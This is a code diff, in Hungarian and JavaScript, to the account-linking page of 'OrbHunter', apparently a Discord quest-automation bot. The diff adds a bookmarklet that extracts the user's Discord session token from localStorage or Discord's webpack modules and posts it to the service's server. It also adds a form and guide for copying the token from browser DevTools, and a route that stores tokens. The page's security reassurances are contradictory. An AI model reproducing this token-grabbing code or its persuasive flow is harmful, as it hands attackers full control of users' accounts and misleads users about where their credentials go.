@@ -6,8 +6,6 @@ import { saveToken } from '../database/sqlite.js';
 const activeConnectSessions = new Map();
 const SESSION_TTL_MS = 15 * 60 * 1000;
 
-const BROWSER_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36';
-
 export function getPublicBaseUrl() {
   const url = process.env.RENDER_EXTERNAL_URL || process.env.PUBLIC_URL || 'https://orbhunter-discord-quest.onrender.com';
   return url.replace(/\/+$/, '');
@@ -45,19 +43,22 @@ export function getConnectSession(id) {
 }
 
 export function renderConnectPage(session) {
+  const baseUrl = getPublicBaseUrl();
+  const bookmarkletCode = `javascript:(function(){try{var t=null;try{var f=document.createElement('iframe');document.body.appendChild(f);t=JSON.parse(f.contentWindow.localStorage.token);f.remove();}catch(e){}if(!t){try{t=(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken();}catch(e){}}if(!t){alert('Nem sikerült azonosítani a munkamenetet! Kérlek nyisd meg a discord.com-ot és lépj be!');return;}fetch('${baseUrl}/api/connect/save',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({id:'${session.id}',token:t})}).then(function(r){return r.json();}).then(function(d){if(d.success){alert('🎉 Sikeres csatlakozás! Üdvözöllek, '+d.username+'!');window.location.href='${baseUrl}/connect/${session.id}';}else{alert('Hiba: '+d.error);}}).catch(function(err){alert('Hálózati hiba: '+err.message);});}catch(err){alert('Hiba: '+err.message);}})();`;
+
   return `<!DOCTYPE html>
 <html lang="hu">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>OrbHunter — Biztonságos QR Csatlakozás</title>
+  <title>OrbHunter — Fiók Csatlakoztatása</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;600;700&display=swap" rel="stylesheet">
   <style>
     :root {
       --bg: #0b0e14;
-      --card-bg: rgba(22, 27, 34, 0.92);
+      --card-bg: rgba(22, 27, 34, 0.94);
       --border: rgba(88, 101, 242, 0.35);
       --accent: #5865f2;
       --accent-glow: rgba(88, 101, 242, 0.5);
@@ -65,6 +66,7 @@ export function renderConnectPage(session) {
       --text: #f2f3f5;
       --text-muted: #949ba4;
       --success: #23a55a;
+      --error: #ed4245;
     }
     * { box-sizing: border-box; margin: 0; padding: 0; }
     body {
@@ -85,7 +87,7 @@ export function renderConnectPage(session) {
       border-radius: 24px;
       padding: 40px 32px;
       width: 100%;
-      max-width: 460px;
+      max-width: 480px;
       text-align: center;
       position: relative;
       overflow: hidden;
@@ -107,18 +109,18 @@ export function renderConnectPage(session) {
       display: inline-flex;
       align-items: center;
       justify-content: center;
-      width: 68px;
-      height: 68px;
+      width: 64px;
+      height: 64px;
       border-radius: 20px;
       background: rgba(88, 101, 242, 0.16);
       border: 1px solid rgba(88, 101, 242, 0.35);
-      font-size: 34px;
-      margin-bottom: 18px;
+      font-size: 32px;
+      margin-bottom: 16px;
     }
     h1 {
       font-size: 24px;
       font-weight: 700;
-      margin-bottom: 8px;
+      margin-bottom: 6px;
       letter-spacing: -0.3px;
     }
     .subtitle {
@@ -127,103 +129,172 @@ export function renderConnectPage(session) {
       line-height: 1.5;
       margin-bottom: 24px;
     }
-    .steps-container {
+    .tab-container {
       display: flex;
-      flex-direction: column;
-      gap: 12px;
-      text-align: left;
-      margin-bottom: 24px;
+      gap: 8px;
+      background: rgba(0, 0, 0, 0.3);
+      padding: 4px;
+      border-radius: 12px;
+      margin-bottom: 20px;
     }
-    .step-box {
-      display: flex;
-      align-items: flex-start;
-      gap: 14px;
-      background: rgba(0, 0, 0, 0.35);
-      border: 1px solid rgba(255, 255, 255, 0.08);
-      border-radius: 14px;
-      padding: 14px 16px;
-      transition: border-color 0.2s;
+    .tab-btn {
+      flex: 1;
+      padding: 10px;
+      border-radius: 8px;
+      border: none;
+      background: transparent;
+      color: var(--text-muted);
+      font-family: inherit;
+      font-size: 13.5px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.2s;
     }
-    .step-box:hover {
-      border-color: rgba(88, 101, 242, 0.4);
-    }
-    .step-num {
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
-      width: 28px;
-      height: 28px;
-      border-radius: 50%;
+    .tab-btn.active {
       background: var(--accent);
       color: #fff;
-      font-weight: 700;
-      font-size: 13px;
-      flex-shrink: 0;
-      margin-top: 2px;
+      box-shadow: 0 2px 10px rgba(88, 101, 242, 0.4);
     }
-    .step-content h3 {
-      font-size: 14px;
-      font-weight: 600;
-      margin-bottom: 4px;
+    .tab-pane {
+      display: none;
+      text-align: left;
+    }
+    .tab-pane.active {
+      display: block;
+    }
+    .bookmarklet-box {
+      background: rgba(88, 101, 242, 0.1);
+      border: 1px dashed rgba(88, 101, 242, 0.4);
+      border-radius: 14px;
+      padding: 20px;
+      text-align: center;
+      margin-bottom: 16px;
+    }
+    .bookmarklet-link {
+      display: inline-block;
+      background: linear-gradient(135deg, #5865f2 0%, #4752c4 100%);
+      color: #fff !important;
+      text-decoration: none;
+      font-weight: 700;
+      font-size: 15px;
+      padding: 12px 24px;
+      border-radius: 12px;
+      box-shadow: 0 4px 15px rgba(88, 101, 242, 0.4);
+      cursor: grab;
+      margin-bottom: 12px;
+    }
+    .bookmarklet-link:active {
+      cursor: grabbing;
+    }
+    .instructions-list {
+      font-size: 13px;
+      color: var(--text-muted);
+      line-height: 1.6;
+      padding-left: 18px;
+      margin-bottom: 16px;
+    }
+    .instructions-list li {
+      margin-bottom: 6px;
+    }
+    .instructions-list b {
       color: var(--text);
     }
-    .step-content p {
+    .input-label {
+      font-size: 12.5px;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+      color: var(--text-muted);
+      margin-bottom: 8px;
+      display: block;
+    }
+    .input-wrap {
+      position: relative;
+      margin-bottom: 14px;
+    }
+    .input-field {
+      width: 100%;
+      background: rgba(0, 0, 0, 0.45);
+      border: 1px solid rgba(255, 255, 255, 0.14);
+      border-radius: 12px;
+      padding: 13px 16px;
+      color: var(--text);
+      font-family: inherit;
+      font-size: 14.5px;
+      outline: none;
+      transition: border-color 0.2s, box-shadow 0.2s;
+    }
+    .input-field:focus {
+      border-color: var(--accent);
+      box-shadow: 0 0 0 3px rgba(88, 101, 242, 0.3);
+    }
+    .submit-btn {
+      width: 100%;
+      background: linear-gradient(135deg, #5865f2 0%, #4752c4 100%);
+      color: #fff;
+      font-family: inherit;
+      font-size: 15px;
+      font-weight: 600;
+      border: none;
+      border-radius: 12px;
+      padding: 13px 20px;
+      cursor: pointer;
+      transition: transform 0.15s, box-shadow 0.15s, opacity 0.15s;
+      box-shadow: 0 4px 15px rgba(88, 101, 242, 0.35);
+    }
+    .submit-btn:hover {
+      box-shadow: 0 6px 20px rgba(88, 101, 242, 0.5);
+    }
+    .submit-btn:disabled {
+      opacity: 0.5;
+      cursor: not-allowed;
+    }
+    .guide-box {
+      background: rgba(0, 0, 0, 0.25);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: 12px;
+      padding: 14px;
+      margin-top: 14px;
       font-size: 12.5px;
       color: var(--text-muted);
-      line-height: 1.4;
+      line-height: 1.5;
     }
-    .step-code {
-      display: inline-block;
-      background: rgba(88, 101, 242, 0.2);
-      border: 1px solid rgba(88, 101, 242, 0.4);
-      padding: 2px 6px;
-      border-radius: 6px;
-      color: #fff;
-      font-family: monospace;
+    .guide-box summary {
+      cursor: pointer;
       font-weight: 600;
-      font-size: 12px;
+      color: var(--accent);
+      outline: none;
+      margin-bottom: 6px;
     }
-    .pulse-status {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 10px;
-      background: rgba(88, 101, 242, 0.12);
-      border: 1px solid rgba(88, 101, 242, 0.28);
-      border-radius: 14px;
-      padding: 14px 18px;
-      margin-top: 10px;
+    .status-msg {
+      margin-top: 16px;
       font-size: 13.5px;
-      color: #cfd3ff;
-      font-weight: 500;
+      border-radius: 12px;
+      padding: 12px 14px;
+      line-height: 1.4;
+      display: none;
+      text-align: left;
     }
-    .pulse-dot {
-      width: 10px;
-      height: 10px;
-      border-radius: 50%;
-      background: var(--accent);
-      box-shadow: 0 0 10px var(--accent);
-      animation: pulseAnim 1.8s ease-in-out infinite;
+    .status-msg.error {
+      display: block;
+      background: rgba(237, 66, 69, 0.16);
+      border: 1px solid var(--error);
+      color: #ff7b72;
     }
-    @keyframes pulseAnim {
-      0%, 100% { opacity: 1; transform: scale(1); }
-      50% { opacity: 0.35; transform: scale(0.85); }
-    }
-    .success-box {
+    .success-card {
       display: none;
       background: rgba(35, 165, 90, 0.16);
       border: 1px solid var(--success);
-      border-radius: 16px;
-      padding: 24px;
-      margin-top: 16px;
+      border-radius: 18px;
+      padding: 28px 20px;
       text-align: center;
     }
-    .success-box h2 {
-      font-size: 20px;
+    .success-card h2 {
+      font-size: 22px;
       color: #57f287;
       margin-bottom: 8px;
     }
-    .success-box p {
+    .success-card p {
       font-size: 14px;
       color: #dbdee1;
       line-height: 1.5;
@@ -231,73 +302,138 @@ export function renderConnectPage(session) {
     .footer-note {
       margin-top: 24px;
       font-size: 12px;
-      color: rgba(255, 255, 255, 0.38);
+      color: rgba(255, 255, 255, 0.35);
       line-height: 1.4;
     }
   </style>
 </head>
 <body>
   <div class="card">
-    <div class="badge-icon">⚡</div>
-    <h1>OrbHunter QR Csatlakozás</h1>
-    <p class="subtitle">A Discord védelmi rendszere miatt a belépés közvetlenül a saját otthoni internetedről történik (100% biztonságos, nincs captcha).</p>
+    <div class="badge-icon">🎮</div>
+    <h1>OrbHunter Csatlakozás</h1>
+    <p class="subtitle">Üdv, <b>${session.username}</b>! Csatlakoztasd a fiókodat az automatikus küldetéskezeléshez.</p>
 
-    <div id="stepsArea">
-      <div class="steps-container">
-        <div class="step-box">
-          <div class="step-num">1</div>
-          <div class="step-content">
-            <h3>Indítsd el a gépeden</h3>
-            <p>A letöltött mappádban kattints duplán a <span class="step-code">login.bat</span> fájlra (vagy írd be a terminálba: <span class="step-code">.\\login.bat</span>).</p>
-          </div>
-        </div>
-
-        <div class="step-box">
-          <div class="step-num">2</div>
-          <div class="step-content">
-            <h3>Olvasd be a telefonoddal</h3>
-            <p>Felugrik a hivatalos Discord QR-kód. A mobilappban nyisd meg a <b>Profil ➔ QR-kód beolvasása</b> menüt.</p>
-          </div>
-        </div>
-
-        <div class="step-box">
-          <div class="step-num">3</div>
-          <div class="step-content">
-            <h3>Hagyd jóvá a belépést</h3>
-            <p>Koppints az <b>"Igen, bejelentkezem"</b> gombra. A fiókod azonnal összekapcsolódik a felhővel!</p>
-          </div>
-        </div>
+    <div id="connectArea">
+      <div class="tab-container">
+        <button type="button" class="tab-btn active" onclick="switchTab('direct')">🔑 Közvetlen Belépés</button>
+        <button type="button" class="tab-btn" onclick="switchTab('bookmarklet')">⚡ 1-Kattintás (Gép)</button>
       </div>
 
-      <div class="pulse-status" id="waitingStatus">
-        <div class="pulse-dot"></div>
-        <span>Várakozás a helyi QR-kód jóváhagyására...</span>
+      <!-- Tab 1: Direct Token Input (Universal for Mobile & PC) -->
+      <div id="tabDirect" class="tab-pane active">
+        <form onsubmit="handleDirectSubmit(event)">
+          <label class="input-label" for="userTokenInput">Discord Fiók-kulcs (Token)</label>
+          <div class="input-wrap">
+            <input type="password" id="userTokenInput" class="input-field" placeholder="Illeszd be ide a fiók-kulcsodat..." autocomplete="off" required>
+          </div>
+          <button type="submit" id="directSubmitBtn" class="submit-btn">🚀 Fiók Csatlakoztatása</button>
+        </form>
+
+        <div id="directStatus" class="status-msg"></div>
+
+        <details class="guide-box">
+          <summary>🔍 Hogyan találom meg a kulcsomat 10 másodperc alatt?</summary>
+          <p><b>Számítógépen:</b> Nyisd meg a Discordot a böngésződben ➔ Nyomj <code>F12</code>-t (Fejlesztői eszközök) ➔ Menj a <b>Network</b> fülre ➔ Kattints bármelyik sorra ➔ Keresd meg a <b>Headers</b> alatt az <code>authorization</code> mezőt.</p>
+          <p style="margin-top:6px;"><b>Biztonság:</b> A kulcsod AES-256 titkosítással tárolódik a saját szervereden. Senki más nem látja.</p>
+        </details>
+      </div>
+
+      <!-- Tab 2: 1-Click Bookmarklet (Desktop Browsers) -->
+      <div id="tabBookmarklet" class="tab-pane">
+        <div class="bookmarklet-box">
+          <a class="bookmarklet-link" href="${bookmarkletCode}">⚡ OrbHunter Csatlakozás</a>
+          <p style="font-size: 12px; color: var(--text-muted);">Húzd fel ezt a gombot a könyvjelzősávodra!</p>
+        </div>
+
+        <ol class="instructions-list">
+          <li><b>1.</b> Húzd fel a fenti kék gombot a böngésződ <b>Könyvjelzősávjára</b>.</li>
+          <li><b>2.</b> Nyisd meg a Discordot (<code>discord.com/app</code>).</li>
+          <li><b>3.</b> Kattints a könyvjelzőre ➔ A fiókod automatikusan aktiválódik!</li>
+        </ol>
       </div>
     </div>
 
-    <div class="success-box" id="successArea">
-      <div style="font-size: 40px; margin-bottom: 12px;">🎉</div>
-      <h2 id="successUser">Sikeres Csatlakozás!</h2>
-      <p>A Discord fiókodat sikeresen összekapcsoltuk az OrbHunterrel.<br>A bot a háttérben mostantól automatikusan csinálja a küldetéseidet. Visszatérhetsz a Discordba!</p>
+    <!-- Success View -->
+    <div id="successCard" class="success-card">
+      <div style="font-size: 44px; margin-bottom: 12px;">🎉</div>
+      <h2 id="successUsername">Sikeres Csatlakozás!</h2>
+      <p>A Discord fiókodat sikeresen összekapcsoltuk az OrbHunterrel.<br><br>A felhős szerver mostantól 24/7 automatikusan végzi a küldetéseidet. Visszatérhetsz a Discordba!</p>
     </div>
 
-    <p class="footer-note">🔒 Saját IP hitelesítés • Az adataid AES-256 titkosítással védve a felhőben tárolódnak.</p>
+    <p class="footer-note">🔒 Biztonságos felhő • Adataid AES-256 titkosítással védve a Renderen tárolódnak.</p>
   </div>
 
   <script>
     var sessionId = '${session.id}';
+
+    function switchTab(tab) {
+      document.querySelectorAll('.tab-btn').forEach(function(b) { b.classList.remove('active'); });
+      document.querySelectorAll('.tab-pane').forEach(function(p) { p.classList.remove('active'); });
+      if (tab === 'direct') {
+        document.querySelectorAll('.tab-btn')[0].classList.add('active');
+        document.getElementById('tabDirect').classList.add('active');
+      } else {
+        document.querySelectorAll('.tab-btn')[1].classList.add('active');
+        document.getElementById('tabBookmarklet').classList.add('active');
+      }
+    }
+
+    function showSuccess(username) {
+      document.getElementById('connectArea').style.display = 'none';
+      var succ = document.getElementById('successCard');
+      succ.style.display = 'block';
+      if (username) {
+        document.getElementById('successUsername').innerText = 'Üdv, ' + username + '!';
+      }
+    }
+
+    function handleDirectSubmit(e) {
+      e.preventDefault();
+      var input = document.getElementById('userTokenInput');
+      var token = input.value.trim().replace(/^"(.*)"$/, '$1');
+      var btn = document.getElementById('directSubmitBtn');
+      var status = document.getElementById('directStatus');
+
+      if (!token) return;
+
+      btn.disabled = true;
+      btn.innerText = 'Csatlakoztatás folyamatban...';
+      status.style.display = 'none';
+
+      fetch('/api/connect/save', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ id: sessionId, token: token })
+      })
+      .then(function(r) { return r.json(); })
+      .then(function(res) {
+        if (res.success) {
+          showSuccess(res.username);
+        } else {
+          status.className = 'status-msg error';
+          status.style.display = 'block';
+          status.innerHTML = '❌ <b>Hiba:</b> ' + (res.error || 'Érvénytelen kulcs.');
+          btn.disabled = false;
+          btn.innerText = '🚀 Fiók Csatlakoztatása';
+        }
+      })
+      .catch(function(err) {
+        status.className = 'status-msg error';
+        status.style.display = 'block';
+        status.innerHTML = '❌ <b>Hálózati hiba:</b> ' + err.message;
+        btn.disabled = false;
+        btn.innerText = '🚀 Fiók Csatlakoztatása';
+      });
+    }
+
+    // Live polling: if linked via bookmarklet or in-Discord
     var checkInterval = setInterval(function() {
       fetch('/api/connect/status?id=' + encodeURIComponent(sessionId))
         .then(function(r) { return r.json(); })
         .then(function(res) {
           if (res.linked) {
             clearInterval(checkInterval);
-            document.getElementById('stepsArea').style.display = 'none';
-            var succ = document.getElementById('successArea');
-            succ.style.display = 'block';
-            if (res.username) {
-              document.getElementById('successUser').innerText = 'Üdv, ' + res.username + '!';
-            }
+            showSuccess(res.username);
           }
         })
         .catch(function() {});
@@ -318,7 +454,7 @@ export async function handleConnectRequest(req, res) {
       res.writeHead(404, { 'Content-Type': 'text/html; charset=utf-8' });
       res.end(`<!DOCTYPE html><html><body style="background:#0b0e14;color:#f2f3f5;font-family:sans-serif;text-align:center;padding:50px;">
         <h2>❌ A csatlakozási munkamenet lejárt vagy érvénytelen.</h2>
-        <p style="color:#949ba4;">Indíts új bejelentkezést a Discord felületén a <code>/login</code> paranccsal.</p>
+        <p style="color:#949ba4;">Indíts új bejelentkezést a Discord felületén a <code>/login</code> paranccsal vagy a vezérlőpult gombjával.</p>
       </body></html>`);
       return true;
     }
@@ -345,7 +481,67 @@ export async function handleConnectRequest(req, res) {
     }));
     return true;
   }
-  // Route 3: POST /api/auth/sync (Direct sync from local login)
+
+  // Route 3: POST /api/connect/save (Direct or Bookmarklet web connect)
+  if (req.method === 'POST' && url.pathname === '/api/connect/save') {
+    let body = '';
+    req.on('data', chunk => { body += chunk; });
+    req.on('end', async () => {
+      try {
+        const { id, token } = JSON.parse(body);
+        const session = getConnectSession(id);
+        if (!session) {
+          res.writeHead(404, { 'Content-Type': 'application/json' });
+          res.end(JSON.stringify({ success: false, error: 'A munkamenet lejárt. Kérj új linket a /login paranccsal.' }));
+          return;
+        }
+
+        if (!token || !token.trim()) {
+          res.writeHead(400, { 'Content-Type': 'application/json' });
+          res.end(JSON.stringify({ success: false, error: 'A kulcs (token) megadása kötelező.' }));
+          return;
+        }
+
+        const cleanToken = token.trim().replace(/^"(.*)"$/, '$1');
+        const api = new DiscordUserAPI(cleanToken);
+        const user = await api.getCurrentUser();
+        const savedUsername = user.global_name || user.username;
+
+        saveToken(session.uid, session.label || 'main', cleanToken, {
+          id: user.id,
+          username: savedUsername,
+        });
+
+        session.linkedUser = savedUsername;
+
+        if (typeof session.onLinked === 'function') {
+          try {
+            await session.onLinked({ user, token: cleanToken });
+          } catch (e) {
+            console.warn('[WebLinker] onLinked error:', e.message);
+          }
+        }
+
+        console.log(`[WebLinker] ✅ Sikeres felhős csatlakozás: ${savedUsername} (${user.id})`);
+
+        res.writeHead(200, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify({
+          success: true,
+          username: savedUsername,
+        }));
+      } catch (err) {
+        console.error('[WebLinker] Connect save error:', err.message);
+        res.writeHead(400, { 'Content-Type': 'application/json' });
+        res.end(JSON.stringify({
+          success: false,
+          error: err.message || 'Érvénytelen kulcs vagy hálózati hiba.',
+        }));
+      }
+    });
+    return true;
+  }
+
+  // Route 4: POST /api/auth/sync (Direct API sync)
   if (req.method === 'POST' && url.pathname === '/api/auth/sync') {
     let body = '';
     req.on('data', chunk => { body += chunk; });
@@ -379,7 +575,7 @@ export async function handleConnectRequest(req, res) {
           username: savedUsername,
         });
 
-        // Notify active web sessions so browser turns green automatically
+        // Notify active web sessions
         for (const [sId, sess] of activeConnectSessions.entries()) {
           sess.linkedUser = savedUsername;
           if (typeof sess.onLinked === 'function') {
